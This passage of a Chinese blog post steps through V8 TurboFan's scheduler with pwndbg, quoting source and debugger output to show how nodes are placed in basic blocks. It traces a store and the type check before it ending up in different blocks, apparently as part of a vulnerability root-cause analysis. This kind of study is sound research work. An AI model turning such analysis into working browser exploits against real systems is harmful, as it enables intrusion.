<p>根据编译原理，Branch下的分支要划分基本块，因此这里获取了输出分支个数，并创建新的基本块</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">In file: /home/hi/Desktop/v8/src/compiler/scheduler.cc</span><br><span class="line">   427   void BuildBlocksForSuccessors(Node* node) &#123;</span><br><span class="line">   428     size_t const successor_cnt = node-&gt;op()-&gt;ControlOutputCount();</span><br><span class="line">   429     Node** successors = zone_-&gt;NewArray&lt;Node*&gt;(successor_cnt);</span><br><span class="line">   430     NodeProperties::CollectControlProjections(node, successors, successor_cnt);</span><br><span class="line">   431     for (size_t index = 0; index &lt; successor_cnt; ++index) &#123;</span><br><span class="line"> ► 432       BuildBlockForNode(successors[index]);</span><br><span class="line">   433     &#125;</span><br><span class="line">   434   &#125;</span><br><span class="line"></span><br><span class="line">   416   BasicBlock* BuildBlockForNode(Node* node) &#123;</span><br><span class="line">   417     BasicBlock* block = schedule_-&gt;block(node);</span><br><span class="line">   418     if (block == nullptr) &#123;</span><br><span class="line">   419       block = schedule_-&gt;NewBasicBlock();</span><br><span class="line"> ► 420       TRACE(&quot;Create block id:%d for #%d:%s\n&quot;, block-&gt;id().ToInt(), node-&gt;id(),</span><br><span class="line">   421             node-&gt;op()-&gt;mnemonic());</span><br><span class="line">   422       FixNode(block, node);</span><br><span class="line">   423     &#125;</span><br><span class="line">   424     return block;</span><br><span class="line">   425   &#125;</span><br></pre></td></tr></table></figure>
<p>当遍历完整个图以后，基本块以及划分，现在是要连接这些基本块</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">In file: /home/hi/Desktop/v8/src/compiler/scheduler.cc</span><br><span class="line">   269         Queue(node-&gt;InputAt(i));</span><br><span class="line">   270       &#125;</span><br><span class="line">   271     &#125;</span><br><span class="line">   272 </span><br><span class="line">   273     for (NodeVector::iterator i = control_.begin(); i != control_.end(); ++i) &#123;</span><br><span class="line"> ► 274       ConnectBlocks(*i);  // Connect block to its predecessor/successors.</span><br><span class="line">   275     &#125;</span><br><span class="line">   276   &#125;</span><br><span class="line">pwndbg&gt; p (*i)-&gt;id()</span><br><span class="line">$85 = 60</span><br><span class="line">pwndbg&gt; p (*i)-&gt;opcode()</span><br><span class="line">$86 = v8::internal::compiler::IrOpcode::kEnd</span><br></pre></td></tr></table></figure>
<p>仍然是从End开始，现在遍历到<code>30:Return</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">In file: /home/hi/Desktop/v8/src/compiler/scheduler.cc</span><br><span class="line">   390         scheduler_-&gt;UpdatePlacement(node, Scheduler::kFixed);</span><br><span class="line">   391         ConnectTailCall(node);</span><br><span class="line">   392         break;</span><br><span class="line">   393       case IrOpcode::kReturn:</span><br><span class="line">   394         scheduler_-&gt;UpdatePlacement(node, Scheduler::kFixed);</span><br><span class="line"> ► 395         ConnectReturn(node);</span><br><span class="line">   396         break;</span><br><span class="line">   397       case IrOpcode::kThrow:</span><br><span class="line">   398         scheduler_-&gt;UpdatePlacement(node, Scheduler::kFixed);</span><br><span class="line">   399         ConnectThrow(node);</span><br><span class="line">   400         break;</span><br><span class="line">pwndbg&gt; p node-&gt;id()</span><br><span class="line">$88 = 30</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>ConnectReturn调用<code>FindPredecessorBlock</code>找到自己属于的基本块，并加入其中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  552   void ConnectReturn(Node* ret) &#123;</span><br><span class="line">  553     Node* return_control = NodeProperties::GetControlInput(ret);</span><br><span class="line">► 554     BasicBlock* return_block = FindPredecessorBlock(return_control);</span><br><span class="line">  555     TraceConnect(ret, return_block, nullptr);</span><br><span class="line">  556     schedule_-&gt;AddReturn(return_block, ret);</span><br><span class="line">  557   &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>其中<code>FindPredecessorBlock</code>中不断的向上遍历，直到发现当前节点在基本块中存在</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">BasicBlock* FindPredecessorBlock(Node* node) &#123;</span><br><span class="line">  BasicBlock* predecessor_block = nullptr;</span><br><span class="line">  while (true) &#123;</span><br><span class="line">    predecessor_block = schedule_-&gt;block(node);</span><br><span class="line">    if (predecessor_block != nullptr) break;</span><br><span class="line">    node = NodeProperties::GetControlInput(node);</span><br><span class="line">  &#125;</span><br><span class="line">  return predecessor_block;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看出，这种找基本块的方法就是不断的遍历寻找当前节点的父节点的基本块。<br>接下来是我们的主角<code>134：Throw</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">In file: /home/hi/Desktop/v8/src/compiler/scheduler.cc</span><br><span class="line">   394         scheduler_-&gt;UpdatePlacement(node, Scheduler::kFixed);</span><br><span class="line">   395         ConnectReturn(node);</span><br><span class="line">   396         break;</span><br><span class="line">   397       case IrOpcode::kThrow:</span><br><span class="line">   398         scheduler_-&gt;UpdatePlacement(node, Scheduler::kFixed);</span><br><span class="line"> ► 399         ConnectThrow(node);</span><br><span class="line">   400         break;</span><br><span class="line">pwndbg&gt; p node-&gt;id()</span><br><span class="line">$91 = 134</span><br><span class="line">pwndbg&gt; p node-&gt;opcode()</span><br><span class="line">$92 = v8::internal::compiler::IrOpcode::kThrow</span><br><span class="line"></span><br><span class="line">In file: /home/hi/Desktop/v8/src/compiler/scheduler.cc</span><br><span class="line">   564   &#125;</span><br><span class="line">   565 </span><br><span class="line">   566   void ConnectThrow(Node* thr) &#123;</span><br><span class="line">   567     Node* throw_control = NodeProperties::GetControlInput(thr);</span><br><span class="line">   568     BasicBlock* throw_block = FindPredecessorBlock(throw_control);</span><br><span class="line"> ► 569     TraceConnect(thr, throw_block, nullptr);</span><br><span class="line">   570     schedule_-&gt;AddThrow(throw_block, thr);</span><br><span class="line">   571   &#125;</span><br><span class="line">pwndbg&gt; p throw_block-&gt;id()</span><br><span class="line">$93 = &#123;</span><br><span class="line">  index_ = 3</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>它绑定在id为3的基本块中，同理，<code>480:Throw</code>绑定在id为4的基本块。当处理完所以的控制流节点以后，<code>BuildCFG</code>就完成了，接下来进入<code>schedule</code>的第二个阶段<code>ComputeSpecialRPONumbering</code>,将基本块的顺序排列好（确定顺序，哪个在前，哪个在后），然后是第三个阶段<code>Scheduler::GenerateDominatorTree</code>构造<code>支配树</code>，有了支配树，就可以确定每一个node被哪个block所支配了。最终确定每个node的所属块是在<code>ScheduleLate</code>流程，我们直接在此断点并跟入。<br>主要逻辑如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">void ProcessQueue(Node* root) &#123;</span><br><span class="line">  ZoneQueue&lt;Node*&gt;* queue = &amp;(scheduler_-&gt;schedule_queue_);</span><br><span class="line">  for (Node* node : root-&gt;inputs()) &#123;</span><br><span class="line">    // Don&#x27;t schedule coupled nodes on their own.</span><br><span class="line">    if (scheduler_-&gt;GetPlacement(node) == Scheduler::kCoupled) &#123;</span><br><span class="line">      node = NodeProperties::GetControlInput(node);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Test schedulability condition by looking at unscheduled use count.</span><br><span class="line">    if (scheduler_-&gt;GetData(node)-&gt;unscheduled_count_ != 0) continue;</span><br><span class="line"></span><br><span class="line">    queue-&gt;push(node);</span><br><span class="line">    do &#123;</span><br><span class="line">      scheduler_-&gt;tick_counter_-&gt;DoTick();</span><br><span class="line">      Node* const node = queue-&gt;front();</span><br><span class="line">      queue-&gt;pop();</span><br><span class="line">      VisitNode(node);</span><br><span class="line">    &#125; while (!queue-&gt;empty());</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>遍历节点，然后调用<code>VisitNode</code>，其中<code>VisitNode</code>源码如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">void VisitNode(Node* node) &#123;</span><br><span class="line">    DCHECK_EQ(0, scheduler_-&gt;GetData(node)-&gt;unscheduled_count_);</span><br><span class="line"></span><br><span class="line">    // Don&#x27;t schedule nodes that are already scheduled.</span><br><span class="line">    if (schedule_-&gt;IsScheduled(node)) return;</span><br><span class="line">    DCHECK_EQ(Scheduler::kSchedulable, scheduler_-&gt;GetPlacement(node));</span><br><span class="line"></span><br><span class="line">    // Determine the dominating block for all of the uses of this node. It is</span><br><span class="line">    // the latest block that this node can be scheduled in.</span><br><span class="line">    TRACE(&quot;Scheduling #%d:%s\n&quot;, node-&gt;id(), node-&gt;op()-&gt;mnemonic());</span><br><span class="line">    BasicBlock* block = GetCommonDominatorOfUses(node);</span><br><span class="line">..............................................</span><br><span class="line">    &#125; else if (scheduler_-&gt;flags_ &amp; Scheduler::kSplitNodes) &#123;</span><br><span class="line">      // Split the &#123;node&#125; if beneficial and return the new &#123;block&#125; for it.</span><br><span class="line">      block = SplitNode(block, node);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Schedule the node or a floating control structure.</span><br><span class="line">    if (IrOpcode::IsMergeOpcode(node-&gt;opcode())) &#123;</span><br><span class="line">      ScheduleFloatingControl(block, node);</span><br><span class="line">    &#125; else if (node-&gt;opcode() == IrOpcode::kFinishRegion) &#123;</span><br><span class="line">      ScheduleRegion(block, node);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      ScheduleNode(block, node);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>可以知道这里是处理所有的节点，将节点添加到对应的基本代码块中。其中获取node的代码块的函数<code>GetCommonDominatorOfUses</code>源码如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">  BasicBlock* GetCommonDominatorOfUses(Node* node) &#123;</span><br><span class="line">    BasicBlock* block = nullptr;</span><br><span class="line">    for (Edge edge : node-&gt;use_edges()) &#123;</span><br><span class="line">      if (!scheduler_-&gt;IsLive(edge.from())) continue;</span><br><span class="line">      BasicBlock* use_block = GetBlockForUse(edge);</span><br><span class="line">      block = block == nullptr</span><br><span class="line">                  ? use_block</span><br><span class="line">                  : use_block == nullptr</span><br><span class="line">                        ? block</span><br><span class="line">                        : BasicBlock::GetCommonDominator(block, use_block);</span><br><span class="line">    &#125;</span><br><span class="line">    return block;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">// static</span><br><span class="line">BasicBlock* BasicBlock::GetCommonDominator(BasicBlock* b1, BasicBlock* b2) &#123;</span><br><span class="line">  while (b1 != b2) &#123;</span><br><span class="line">    if (b1-&gt;dominator_depth() &lt; b2-&gt;dominator_depth()) &#123;</span><br><span class="line">      b2 = b2-&gt;dominator();</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      b1 = b1-&gt;dominator();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return b1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其算法是遍历<code>use</code>节点，即当前节点的下一层的<code>from</code>节点，首先计算出这些节点属于哪个代码块，然后选取出这些代码块共同的父节点做为当前节点的代码块。<br><img src="https://i.loli.net/2021/07/13/4mLkYG8XyQ7bRlE.png" alt="image.png"><br>从图中来看，Store的代码块决定链是这样的<code>76:Store-&gt;472:Load-&gt;474:Word32Equal-&gt;475:DeoptimizeUnless-&gt;479:DeoptimizeUnless-&gt;GetCommonDominator(423:Unreachable,480:Throw)</code>。之前已经分析过，480:Throw是划分在基本块4，而134:Throw是被划分在基本块3中。那么现在就是分析一下<code>423:Unreachable</code>属于哪个基本块？</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">In file: /home/hi/Desktop/v8/src/compiler/scheduler.cc</span><br><span class="line">   1584       BasicBlock* use_block = GetBlockForUse(edge);</span><br><span class="line">   1585       block = block == nullptr</span><br><span class="line">   1586                   ? use_block</span><br><span class="line">   1587                   : use_block == nullptr</span><br><span class="line">   1588                         ? block</span><br><span class="line"> ► 1589                         : BasicBlock::GetCommonDominator(block, use_block);</span><br><span class="line">   1590     &#125;</span><br><span class="line">   1591     return block;</span><br><span class="line">   1592   &#125;</span><br><span class="line">   1593 </span><br><span class="line">pwndbg&gt; p block-&gt;id()</span><br><span class="line">$25 = &#123;</span><br><span class="line">  index_ = 4</span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; p use_block-&gt;id()</span><br><span class="line">$26 = &#123;</span><br><span class="line">  index_ = 3</span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; p node-&gt;id()</span><br><span class="line">$27 = 423</span><br></pre></td></tr></table></figure>
<p>即寻找134和480基本块的公共块节点<br>从图中看，也就是24所在的块<br><img src="https://i.loli.net/2021/07/13/YEDdLaHfncZiUCl.png" alt="image.png"><br>调试也可以验证出块id确实为3</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">In file: /home/hi/Desktop/v8/src/compiler/scheduler.cc</span><br><span class="line">   415 </span><br><span class="line">   416   BasicBlock* BuildBlockForNode(Node* node) &#123;</span><br><span class="line">   417     BasicBlock* block = schedule_-&gt;block(node);</span><br><span class="line">   418     if (block == nullptr) &#123;</span><br><span class="line">   419       block = schedule_-&gt;NewBasicBlock();</span><br><span class="line"> ► 420       TRACE(&quot;Create block id:%d for #%d:%s\n&quot;, block-&gt;id().ToInt(), node-&gt;id(),</span><br><span class="line">   421             node-&gt;op()-&gt;mnemonic());</span><br><span class="line">   422       FixNode(block, node);</span><br><span class="line">   423     &#125;</span><br><span class="line">   424     return block;</span><br><span class="line">   425   &#125;</span><br><span class="line">pwndbg&gt; p block-&gt;id()</span><br><span class="line">$32 = &#123;</span><br><span class="line">  index_ = 3</span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; p node-&gt;id()</span><br><span class="line">$33 = 24</span><br></pre></td></tr></table></figure>
<p>因此<code>423:Unreachable</code>属于基本块3，而<code>423:Unreachable</code>又在<code>480:Throw</code>之上，是<code>480:Throw</code>公共块节点。因此，<code>GetCommonDominator(423:Unreachable,480:Throw)</code>返回的block的id为3，所以<code>76:Store</code>是被划分进基本块3的。同理，我们来分析一下<code>469:DeoptimizeUnless</code>这个节点，该节点是执行Stroe之前对对象类型进行检查的操作。<br><img src="https://i.loli.net/2021/07/14/WEdFD4Z5jT7QpGN.png" alt="image.png"><br>该节点的blockID &#x3D; GetCommonDominator(470:Merge,471:EffectPhi)，其中470是一个<code>Merge</code>，因此其在<code>BuildCFG</code>阶段的<code>BuildBlocks</code>就已经划分，通过调试其块id为4</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">In file: /home/hi/Desktop/v8/src/compiler/scheduler.cc</span><br><span class="line">   415 </span><br><span class="line">   416   BasicBlock* BuildBlockForNode(Node* node) &#123;</span><br><span class="line">   417     BasicBlock* block = schedule_-&gt;block(node);</span><br><span class="line">   418     if (block == nullptr) &#123;</span><br><span class="line">   419       block = schedule_-&gt;NewBasicBlock();</span><br><span class="line"> ► 420       TRACE(&quot;Create block id:%d for #%d:%s\n&quot;, block-&gt;id().ToInt(), node-&gt;id(),</span><br><span class="line">   421             node-&gt;op()-&gt;mnemonic());</span><br><span class="line">   422       FixNode(block, node);</span><br><span class="line">   423     &#125;</span><br><span class="line">   424     return block;</span><br><span class="line">   425   &#125;</span><br><span class="line">pwndbg&gt; p block-&gt;id()</span><br><span class="line">$35 = &#123;</span><br><span class="line">  index_ = 4</span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; p node-&gt;id()</span><br><span class="line">$36 = 470</span><br><span class="line">pwndbg&gt; </span><br></pre></td></tr></table></figure>
<p>而471的blockid由76:Stroe决定，前面我们推出id为3，由于<code>Merge</code>和<code>EffectPhi</code>是两个特殊节点，因此不能用前面的方法推导其blockid，因为在<code>GetCommonDominatorOfUses</code>函数中调用了<code>GetBlockForUse</code>，而该函数对这两种节点做了特殊处理</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">BasicBlock* GetBlockForUse(Edge edge) &#123;</span><br><span class="line">    // TODO(titzer): ignore uses from dead nodes (not visited in PrepareUses()).</span><br><span class="line">    // Dead uses only occur if the graph is not trimmed before scheduling.</span><br><span class="line">    Node* use = edge.from();</span><br><span class="line">    if (IrOpcode::IsPhiOpcode(use-&gt;opcode())) &#123;</span><br><span class="line">      .........................</span><br><span class="line">      // If the use is from a fixed (i.e. non-floating) phi, we use the</span><br><span class="line">      // predecessor block of the corresponding control input to the merge.</span><br><span class="line">      if (scheduler_-&gt;GetPlacement(use) == Scheduler::kFixed) &#123;</span><br><span class="line">        TRACE(&quot;  input@%d into a fixed phi #%d:%s\n&quot;, edge.index(), use-&gt;id(),</span><br><span class="line">              use-&gt;op()-&gt;mnemonic());</span><br><span class="line">        Node* merge = NodeProperties::GetControlInput(use, 0);</span><br><span class="line">        DCHECK(IrOpcode::IsMergeOpcode(merge-&gt;opcode()));</span><br><span class="line">        Node* input = NodeProperties::GetControlInput(merge, edge.index());</span><br><span class="line">        return FindPredecessorBlock(input);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; else if (IrOpcode::IsMergeOpcode(use-&gt;opcode())) &#123;</span><br><span class="line">      // If the use is from a fixed (i.e. non-floating) merge, we use the</span><br><span class="line">      // predecessor block of the current input to the merge.</span><br><span class="line">      if (scheduler_-&gt;GetPlacement(use) == Scheduler::kFixed) &#123;</span><br><span class="line">        TRACE(&quot;  input@%d into a fixed merge #%d:%s\n&quot;, edge.index(), use-&gt;id(),</span><br><span class="line">              use-&gt;op()-&gt;mnemonic());</span><br><span class="line">        return FindPredecessorBlock(edge.to());</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">.........................</span><br></pre></td></tr></table></figure>
<p>因此，对于471，其<code>BlockID=FindPredecessorBlock(469)</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">In file: /home/hi/Desktop/v8/src/compiler/scheduler.cc</span><br><span class="line">   1615         TRACE(&quot;  input@%d into a fixed phi #%d:%s\n&quot;, edge.index(), use-&gt;id(),</span><br><span class="line">   1616               use-&gt;op()-&gt;mnemonic());</span><br><span class="line">   1617         Node* merge = NodeProperties::GetControlInput(use, 0);</span><br><span class="line">   1618         DCHECK(IrOpcode::IsMergeOpcode(merge-&gt;opcode()));</span><br><span class="line">   1619         Node* input = NodeProperties::GetControlInput(merge, edge.index());</span><br><span class="line"> ► 1620         return FindPredecessorBlock(input);</span><br><span class="line">   1621       &#125;</span><br><span class="line">pwndbg&gt; p input-&gt;id()</span><br><span class="line">$50 = 469</span><br><span class="line">pwndbg&gt; p use-&gt;id()</span><br><span class="line">$51 = 471</span><br></pre></td></tr></table></figure>
<p>即向上查找，从图上来看，找到的就是465所处的blockID<br><img src="https://i.loli.net/2021/07/14/hDg9lbBKrmnLMzk.png" alt="image.png"><br>由于465是Branch的一个分支，因此它的blockID在<code>BuildCFG</code>阶段就确定了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">In file: /home/hi/Desktop/v8/src/compiler/scheduler.cc</span><br><span class="line">   415 </span><br><span class="line">   416   BasicBlock* BuildBlockForNode(Node* node) &#123;</span><br><span class="line">   417     BasicBlock* block = schedule_-&gt;block(node);</span><br><span class="line">   418     if (block == nullptr) &#123;</span><br><span class="line">   419       block = schedule_-&gt;NewBasicBlock();</span><br><span class="line"> ► 420       TRACE(&quot;Create block id:%d for #%d:%s\n&quot;, block-&gt;id().ToInt(), node-&gt;id(),</span><br><span class="line">   421             node-&gt;op()-&gt;mnemonic());</span><br><span class="line">   422       FixNode(block, node);</span><br><span class="line">   423     &#125;</span><br><span class="line">   424     return block;</span><br><span class="line">   425   &#125;</span><br><span class="line">pwndbg&gt; p block-&gt;id()</span><br><span class="line">$56 = &#123;</span><br><span class="line">  index_ = 7</span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; p node-&gt;id()</span><br><span class="line">$57 = 465</span><br></pre></td></tr></table></figure>
<p>同理，对于<code>470：Merge</code>，也是FindPredecessorBlock(469)，返回的blockID为7</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">In file: /home/hi/Desktop/v8/src/compiler/scheduler.cc</span><br><span class="line">   1623       // If the use is from a fixed (i.e. non-floating) merge, we use the</span><br><span class="line">   1624       // predecessor block of the current input to the merge.</span><br><span class="line">   1625       if (scheduler_-&gt;GetPlacement(use) == Scheduler::kFixed) &#123;</span><br><span class="line">   1626         TRACE(&quot;  input@%d into a fixed merge #%d:%s\n&quot;, edge.index(), use-&gt;id(),</span><br><span class="line">   1627               use-&gt;op()-&gt;mnemonic());</span><br><span class="line"> ► 1628         return FindPredecessorBlock(edge.to());</span><br><span class="line">   1629       &#125;</span><br><span class="line">   1630     &#125;</span><br><span class="line">pwndbg&gt; p edge.to()-&gt;id()</span><br><span class="line">$60 = 469</span><br><span class="line">pwndbg&gt; p use-&gt;id()</span><br><span class="line">$61 = 470</span><br></pre></td></tr></table></figure>
<p>因此<code>469:DeoptimizeUnless</code>这个节点是属于基本块7的。<br>从以上分析，可以知道<code>ScheduleLate</code>阶段就是在划分节点所属的基本块，在<code>ScheduleLate</code>流程后，接下来是<code>SealFinalSchedule</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">void Scheduler::SealFinalSchedule() &#123;</span><br><span class="line">  TRACE(&quot;--- SEAL FINAL SCHEDULE ------------------------------------\n&quot;);</span><br><span class="line"></span><br><span class="line">  // Serialize the assembly order and reverse-post-order numbering.</span><br><span class="line">  special_rpo_-&gt;SerializeRPOIntoSchedule();</span><br><span class="line">  special_rpo_-&gt;PrintAndVerifySpecialRPO();</span><br><span class="line"></span><br><span class="line">  // Add collected nodes for basic blocks to their blocks in the right order.</span><br><span class="line">  int block_num = 0;</span><br><span class="line">  for (NodeVector* nodes : scheduled_nodes_) &#123;</span><br><span class="line">    BasicBlock::Id id = BasicBlock::Id::FromInt(block_num++);</span><br><span class="line">    BasicBlock* block = schedule_-&gt;GetBlockById(id);</span><br><span class="line">    if (nodes) &#123;</span><br><span class="line">      for (Node* node : base::Reversed(*nodes)) &#123;</span><br><span class="line">        schedule_-&gt;AddNode(block, node);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
